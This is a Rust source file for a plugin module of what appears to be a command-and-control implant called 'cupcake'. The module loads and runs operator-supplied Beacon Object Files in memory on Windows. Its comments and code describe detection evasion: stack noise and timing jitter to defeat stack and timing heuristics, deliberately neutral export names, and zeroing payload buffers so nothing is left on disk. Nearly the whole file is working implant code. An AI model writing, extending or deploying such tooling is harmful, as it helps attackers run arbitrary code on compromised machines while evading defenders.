//! L2 `mod_bof` — on-demand Beacon Object File execution.
//!
//! OPSEC notes (same-process model — cannot fully isolate from host agent):
//! - Loaded only when operator pushes / auto-push after module_required
//! - PEB-resolved APIs + COFF in-memory path live in cupcake-core `bof` feature
//! - Short jitter + stack noise before execute to break simple timing/stack heuristics
//! - Unload via Stage0 FreeLibrary after window (operator module_unload)
//!
//! Payload (UTF-8 JSON):
//! ```json
//! { "data": "<base64 COFF>", "args": "<base64 args optional>" }
//! ```

use base64::Engine;
use std::sync::OnceLock;
use tokio::runtime::Runtime;

fn runtime() -> &'static Runtime {
    static RT: OnceLock<Runtime> = OnceLock::new();
    RT.get_or_init(|| {
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("plugin rt")
    })
}

/// Small operator-driven jitter (not long sleep — avoid sandbox-only patterns).
fn opsec_pre_exec() {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        cupcake_core::stealth::stack::add_stack_noise();
    }
    // 30–180 ms
    let n = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0)
        % 150_000_000)
        + 30_000_000;
    std::thread::sleep(std::time::Duration::from_nanos(n as u64));
}

// ABI export names are intentionally neutral (x0..x3) — the agent resolves
// them via pe_map/module_loader; see those resolvers before renaming.
#[export_name = "x0"]
pub extern "C" fn mod_init() -> i32 {
    let _ = runtime();
    opsec_pre_exec();
    0
}

#[export_name = "x1"]
pub unsafe extern "C" fn mod_invoke(
    cmd_type: *const u8,
    cmd_type_len: u32,
    payload: *const u8,
    payload_len: u32,
    out_ptr: *mut *mut u8,
    out_len: *mut u32,
) -> i32 {
    if out_ptr.is_null() || out_len.is_null() {
        return -1;
    }
    *out_ptr = std::ptr::null_mut();
    *out_len = 0;

    let ct = slice_str(cmd_type, cmd_type_len).unwrap_or("bof_exec");
    if ct != "bof_exec" && ct != "bof" {
        return write_json(
            out_ptr,
            out_len,
            "",
            &format!("plugin: unsupported '{ct}'"),
        );
    }

    let body = match slice_bytes(payload, payload_len) {
        Some(b) => b,
        None => return write_json(out_ptr, out_len, "", "empty payload"),
    };

    let (mut coff, mut args) = match parse_bof_payload(body) {
        Ok(v) => v,
        Err(e) => return write_json(out_ptr, out_len, "", &e),
    };

    opsec_pre_exec();

    #[cfg(all(windows))]
    {
        let result = runtime()
            .block_on(async { cupcake_core::loader::bof::BofLoader::execute(&coff, &args).await });
        // 用完即焚：清零载荷缓冲（不落盘；堆上副本不保留明文）
        burn_bytes(&mut coff);
        burn_bytes(&mut args);
        match result {
            Ok(out) => write_json(out_ptr, out_len, &out, ""),
            Err(e) => write_json(out_ptr, out_len, "", &format!("exec: {e}")),
        }
    }
    #[cfg(not(windows))]
    {
        let mut c = coff;
        let mut a = args;
        burn_bytes(&mut c);
        burn_bytes(&mut a);
        write_json(out_ptr, out_len, "", "unsupported on this platform")
    }
}

fn burn_bytes(b: &mut [u8]) {
    for x in b.iter_mut() {
        *x = 0;
    }
}

#[export_name = "x2"]
pub unsafe extern "C" fn mod_free(ptr: *mut u8, len: u32) {
    if ptr.is_null() || len == 0 {
        return;
    }
    let _ = Vec::from_raw_parts(ptr, len as usize, len as usize);
}

#[export_name = "x3"]
pub extern "C" fn mod_shutdown() -> i32 {
    0
}

fn parse_bof_payload(body: &[u8]) -> Result<(Vec<u8>, Vec<u8>), String> {
    // Prefer JSON envelope
    if let Ok(v) = serde_json::from_slice::<serde_json::Value>(body) {
        let data_b64 = v
            .get("data")
            .and_then(|x| x.as_str())
            .ok_or_else(|| "missing data field (base64)".to_string())?;
        let args_b64 = v.get("args").and_then(|x| x.as_str()).unwrap_or("");
        let coff = base64::engine::general_purpose::STANDARD
            .decode(data_b64.trim())
            .map_err(|e| format!("data decode: {e}"))?;
        let args = if args_b64.is_empty() {
            Vec::new()
        } else {
            base64::engine::general_purpose::STANDARD
                .decode(args_b64.trim())
                .map_err(|e| format!("args decode: {e}"))?
        };
        if coff.len() < 20 {
            return Err("payload too small".into());
        }
        return Ok((coff, args));
    }
    // Raw: entire body is the payload image, no args
    if body.len() < 20 {
        return Err("raw payload too small".into());
    }
    Ok((body.to_vec(), Vec::new()))
}

/// Bound to caller's payload buffers — not 'static.
unsafe fn slice_str<'a>(p: *const u8, len: u32) -> Option<&'a str> {
    if p.is_null() || len == 0 {
        return None;
    }
    std::str::from_utf8(std::slice::from_raw_parts(p, len as usize)).ok()
}

unsafe fn slice_bytes<'a>(p: *const u8, len: u32) -> Option<&'a [u8]> {
    if p.is_null() || len == 0 {
        return None;
    }
    Some(std::slice::from_raw_parts(p, len as usize))
}

unsafe fn write_json(out_ptr: *mut *mut u8, out_len: *mut u32, stdout: &str, stderr: &str) -> i32 {
    let v = serde_json::json!({ "stdout": stdout, "stderr": stderr, "path": null });
    let mut bytes = match serde_json::to_vec(&v) {
        Ok(b) => b,
        Err(_) => return -4,
    };
    bytes.shrink_to_fit();
    let len = bytes.len() as u32;
    let ptr = bytes.as_mut_ptr();
    std::mem::forget(bytes);
    *out_ptr = ptr;
    *out_len = len;
    0
}
